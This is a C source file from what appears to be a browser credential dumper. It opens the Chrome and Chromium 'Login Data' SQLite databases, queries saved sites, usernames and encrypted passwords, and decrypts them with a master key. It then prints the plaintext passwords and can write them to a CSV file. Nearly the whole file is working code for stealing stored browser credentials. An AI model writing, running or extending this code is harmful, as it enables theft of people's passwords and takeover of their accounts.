#include "chrome.h"
#include "main.h"

#include "functions.h"

/** 
 * Prepare the sqlite3 statement to retrieve the creds from the db
 *
 * @return 1 on success, -1 on failure
 */
int prepare_sqlite_statement(char *login_data_path, sqlite3 **db, sqlite3_stmt **stmt) {
	int rc = sqlite3_open(login_data_path, db);
	if(rc != SQLITE_OK) {
		fprintf(stderr, "sqlite3_open() failure: %s\n", sqlite3_errmsg(*db));
		sqlite3_close(*db);
		return -1;
	}
	char *sql = "SELECT action_url, username_value, password_value FROM logins";
	rc = sqlite3_prepare_v2(*db, sql, -1, stmt, NULL);
	if(rc != SQLITE_OK) {
		fprintf(stderr, "sqlite3_prepare_v2() failure\n");
		sqlite3_close(*db);
		return -1;
	}
	return 1;
}

/**
 * Fetch the data of the sqlite3 query
 *
 * @return 1 on success, -1 on failure
 */
int fetch_sqlite_data(char **website, char **username, char **cipher_password, int *len_cipher_password, sqlite3_stmt **stmt) {
	// TODO: View better alternative to strncpy
	*website = malloc(strlen(sqlite3_column_text(*stmt, 0))+1);
	*username = malloc(strlen(sqlite3_column_text(*stmt, 1))+1);
	*cipher_password = malloc(sqlite3_column_bytes(*stmt, 2)+1);
	if(*website == 0 || *username == 0 || *cipher_password == 0) {
		fprintf(stderr, "malloc() failure\n");
		free(*website);
		free(*username);
		free(*cipher_password);
		return -1;
	}

	safe_strcpy(*website, (char *)sqlite3_column_text(*stmt, 0), strlen(sqlite3_column_text(*stmt, 0)));
	safe_strcpy(*username, (char *)sqlite3_column_text(*stmt, 1), strlen(sqlite3_column_text(*stmt, 1)));
	memcpy(*cipher_password, (char *)sqlite3_column_blob(*stmt, 2), sqlite3_column_bytes(*stmt, 2));
	(*cipher_password)[sqlite3_column_bytes(*stmt, 2)] = '\0';
	*len_cipher_password = sqlite3_column_bytes(*stmt, 2);

	return 1;
}

/**
 * Main function that tries to retrieve the creds
 *
 * @return 1 on success, -1 on failure
 */
int get_chrome_creds(char *login_data_path, const char *output) {
	sqlite3 *db;
	sqlite3_stmt *stmt;
	if(prepare_sqlite_statement(login_data_path, &db, &stmt) == -1) {
		fprintf(stderr, "prepare_sqlite3_statement() failure\n");
		return -1;
	}

	char *masterkey;
	if(get_masterkey(login_data_path, &masterkey) == -1) {
		fprintf(stderr, "get_masterkey() failure\n");
		return -1;
	}

	char *website;
	char *username;
	char *cipher_password;
	int len_cipher_password;
	char *plaintext_password;
	
	FILE *output_fd;
	if(output != NULL) {
		output_fd = fopen(output, "ab");
	}

	while(sqlite3_step(stmt) != SQLITE_DONE) {
		if(fetch_sqlite_data(&website, &username, &cipher_password, &len_cipher_password, &stmt) == -1) {
			fprintf(stderr, "fetch_sqlite_data() failure\n");
			return -1;
		} 
		if(strlen(website) != 0) {
			if(decrypt_chrome_cipher(cipher_password, len_cipher_password, &plaintext_password, masterkey) == -1) {
				fprintf(stderr, "decrypt_chrome_cipher() failure\n");
				return -1;
			}

			printf("[+] Website: %s\n[+] Username: %s\n[+] Password: %s\n\n", 
				website,
				username,
				plaintext_password);

			if(output != NULL) {
				fprintf(output_fd, "\"%s\",\"%s\",\"%s\"\n", 
					website,
					username,
					plaintext_password);
			}
			free(website);
			free(username);
			free(cipher_password);
			free(plaintext_password);
		}
	}

	if(output != NULL) {
		fclose(output_fd);
	}
	if(masterkey != NULL) {
		free(masterkey);
	}
	sqlite3_close(db);

	return 1;
}

/**
 * Chrome functions wrapper that sets up everything we need
 *
 * @return 1 on success, -1 on failure 
 */
int dump_chrome(int verbose, const char *output_file) {
	puts("[*] Starting Chrome dump...");
	int result = 0;
	char chrome_path[MAX_PATH_SIZE];
	char chrome_login_data_path[MAX_PATH_SIZE];
	char chromium_path[MAX_PATH_SIZE];
	char chromium_login_data_path[MAX_PATH_SIZE];
	//char brave_path[MAX_PATH_SIZE];
	//char brave_login_data_path[MAX_PATH_SIZE];

	load_chrome_paths(chrome_path, chrome_login_data_path, chromium_path, chromium_login_data_path);
	printf("chromium login path: %s\n", chromium_login_data_path);

	// TODO: S_OK / F_OK ?
	if(access(chrome_login_data_path,0) != -1) {
		printf("[*] Starting Chrome credentials dump...\n\n");
		result = get_chrome_creds(chrome_login_data_path, output_file);
	}

	// TODO: S_OK / F_OK ?
	if(access(chromium_login_data_path, 0) != -1) {
		printf("[*] Starting Chromium credentials dump...\n\n");
		result = get_chrome_creds(chromium_login_data_path, output_file);
	} 

	//if(access(brave_login_data_path, F_OK) != -1) {
	//	printf("[*] Starting Brave credentials dump...\n\n");
	//	result = get_creds(brave_login_data_path, output);
	//}

	if(result == 0) {
		fprintf(stderr, "[-] Couldn't find any Chrome / Chromium installation\n");
		return -1;
	}
	else if (result == -1) {
		fprintf(stderr, "[-] An error occured\n");
		return -1;
	}
	return 1;
}
